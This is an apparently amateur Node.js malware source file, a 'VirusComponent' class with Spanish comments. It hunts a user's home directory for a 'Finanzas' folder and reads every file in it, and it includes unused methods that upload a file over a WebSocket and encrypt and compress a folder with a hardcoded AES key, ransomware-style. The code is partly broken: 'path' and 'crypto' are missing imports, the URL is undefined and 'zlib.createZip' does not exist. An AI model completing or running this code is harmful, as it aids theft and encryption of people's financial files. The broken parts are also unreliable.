import fs, { promises } from 'node:fs';
import { join } from 'node:path';
import zlib from 'node:zlib';

class VirusComponent {
    constructor() {
    }

    async attack() {
        console.log("***********************************************");
        console.log("Launching Attack...");
        console.log("***********************************************");
        console.log("PHASE1. Searching for Finanzas folder...");
        console.log("***********************************************");
        const finanzasFolderPath = await this.findFolder();
        if(finanzasFolderPath) {
            console.log("PHASE1.SUCCESS. Finanzas folder found at:", finanzasFolderPath);
            console.log("***********************************************");
            console.log("PHASE2. Reading files in Finanzas folder...");
            console.log("***********************************************");
            const binaryFiles = await this.readFiles(finanzasFolderPath, 'binary');
            const textFiles = await this.readFiles(finanzasFolderPath, 'text');
            if(textFiles.length > 0) {
                textFiles.forEach(file => console.log(`Text file: ${file.name}. Content: ${file.content}`))
            } else {
                console.log("PHASE2.WARNING. No text files found in the Finanzas folder");
            }
            if(binaryFiles.length > 0) {
                binaryFiles.forEach(file => console.log(`Binary file: ${file.name}. Content: ${file.content}`))
            } else {
                console.log("PHASE2.WARNING.No binary files found in the Finanzas folder");
            }
            console.log("***********************************************");
            console.log("PHASE2.SUCCESS. Files read successfully.");
        } else {
            console.log("PHASE1.ERROR. Finanzas folder not found in the PC.");
            console.log("Attack stopped...");
            console.log("***********************************************");
            return;
        }
    }

    sendFileToServer(file) {
        return new Promise((resolve, reject) => {
            const socket = new WebSocket(url);

            socket.onopen = () => {
                // Convert the file to binary data
                const reader = new FileReader();
                reader.onload = () => {
                    const fileData = reader.result;
                    socket.send(fileData);
                };
                reader.onerror = (error) => reject(error);
                reader.readAsArrayBuffer(file);
            };

            socket.onerror = (error) => reject(error);

            socket.onmessage = (event) => {
                const response = event.data;
                resolve(response);
            };

            socket.onclose = () => resolve('Connection closed');
        });
    }

    encryptAndCompressFolder(folderPath) {
        return new Promise((resolve, reject) => {
            // Read the files in the folder
            fs.readdir(folderPath, (err, files) => {
                if (err) {
                    reject(err);
                    return;
                }
    
                // Create a temporary folder to store the encrypted files
                const tempFolderPath = path.join(folderPath, 'temp');
                fs.mkdirSync(tempFolderPath);

                // Encrypt and compress each file
                const promises = files.map((file) => {
                    return new Promise((resolve, reject) => {
                        const filePath = path.join(folderPath, file);
                        const tempFilePath = path.join(tempFolderPath, file);

                        // Read the file
                        fs.readFile(filePath, (err, data) => {
                            if (err) {
                                reject(err);
                                return;
                            }

                            // Encrypt the file data
                            const cipher = crypto.createCipher('aes-256-cbc', 'encryptionKey');
                            const encryptedData = Buffer.concat([cipher.update(data), cipher.final()]);

                            // Compress the encrypted data
                            zlib.gzip(encryptedData, (err, compressedData) => {
                                if (err) {
                                    reject(err);
                                    return;
                                }

                                // Write the compressed data to the temporary file
                                fs.writeFile(tempFilePath, compressedData, (err) => {
                                    if (err) {
                                        reject(err);
                                        return;
                                    }

                                    resolve();
                                });
                            });
                        });
                    });
                });

                // Wait for all files to be encrypted and compressed
                Promise.all(promises)
                    .then(() => {
                        // Compress the temporary folder
                        const compressedFolderPath = path.join(folderPath, 'compressed.zip');
                        const output = fs.createWriteStream(compressedFolderPath);
                        const archive = zlib.createZip();

                        output.on('close', () => {
                            // Remove the temporary folder
                            fs.rmdirSync(tempFolderPath, { recursive: true });
                            resolve('Encryption and compression completed');
                        });

                        archive.directory(tempFolderPath, false);
                        archive.pipe(output);
                        archive.finalize();
                    }).catch((err) => reject(err));
            });
        });
    }

    //se debe corregir este metodo para que la busqueda sea global en todas las carpeta de la pc y no en una sola como parametro.
    async findFolder(folderPath = 'C:\\Users\\josem') {
        try {
            const files = await promises.readdir(folderPath);
            for (const file of files) {
                const filePath = join(folderPath, file);
                const stats = await promises.stat(filePath);
                if (stats.isDirectory() && file.toLowerCase() === 'finanzas') return filePath;
            }
            return null;
        } catch (error) {
            console.error("PHASE1.ERROR. Something went wrong trying to get 'finanzas' folder path", error);
            throw error;
        }
    }
    
    //la lectura de los archivos binarios tiene un comportamiento inesperado, se debe corregir.
    async readFiles(folderPath, fileType) {
        try {
            const files = await promises.readdir(folderPath);
            const fileContents = [];

            for (const file of files) {
                const filePath = join(folderPath, file);
                const stats = await promises.stat(filePath);
                if (stats.isFile()) {
                    let content;
                    if (fileType === 'text') {
                        content = await promises.readFile(filePath, 'utf8');
                    } else if (fileType === 'binary') {
                        content = await promises.readFile(filePath);
                    }
                    fileContents.push({ name: file, content });
                } else if (stats.isDirectory()) {
                    // Si es un directorio, se busca recursivamente en él
                    const subFiles = await this.readFiles(filePath, fileType);
                    fileContents.push(...subFiles);
                }
            }
            return fileContents;
        } catch (error) {
            console.error("Error al leer los archivos:", error);
            throw error;
        }
    }
}

const virus = new VirusComponent();
virus.attack().catch(console.error);